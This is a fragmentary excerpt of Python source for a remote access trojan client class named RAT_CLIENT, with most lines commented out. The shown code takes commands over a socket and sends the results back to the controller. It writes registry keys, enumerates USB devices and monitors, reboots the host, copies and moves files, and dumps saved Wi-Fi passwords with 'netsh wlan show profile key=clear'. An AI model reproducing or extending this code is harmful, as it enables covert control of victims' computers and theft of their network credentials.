...
class RAT_CLIENT:
    ...
    def gather_info(self):
        ...
        # We are splitting all : so for the os.getcwd() needs to be changed so it does not get split by the :
        info = str(
...
#                         key = OpenKey(HKEY_CURRENT_CONFIG,
#                                       root, 0, KEY_ALL_ACCESS)
#                         SetValueEx(key, key2, 0, REG_SZ, str(value))
#                         CloseKey(key)
...
#                     if const == 'HKEY_LOCAL_MACHINE':
#                         CreateKeyEx(HKEY_LOCAL_MACHINE,
#                                     root, 0, KEY_ALL_ACCESS)
#                     if const == 'HKEY_USERS':
...
#                     if const == 'HKEY_CURRENT_CONFIG':
#                         CreateKeyEx(HKEY_CURRENT_CONFIG,
#                                     root, 0, KEY_ALL_ACCESS)
...
#                     ["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
#                 s.send(p.encode())

#             elif command == 'monitors':
#                 p = subprocess.check_output(
#                     ["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
#                 s.send(p.encode())
...
#                 s.send(
#                     f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
...
#                 output = subprocess.check_output(
#                     'netsh wlan show profiles', encoding='oem')
#                 s.send(output.encode())
...
#                 try:
#                     output = subprocess.check_output(
#                         f'netsh wlan show profile {profile} key=clear', encoding='oem')
#                     s.send(output.encode())
#                 except:
#                     self.errorsend()
...
#             elif command[:2] == 'cp':
#                 try:
#                     shutil.copyfile(command.split(
#                         " ")[1], command.split(" ")[2])
#                     s.send(
#                         f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
#                 except:
#                     self.errorsend()
...
#                     s.send(
#                         f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
#                 except:
#                     self.errorsend()
...
#                             'https://yandex.ru/search/?text='+quiery)
#                     else:
#                         webbrowser.open_new_tab(
#                             'https://yandex.ru/search/?text=' + quiery)
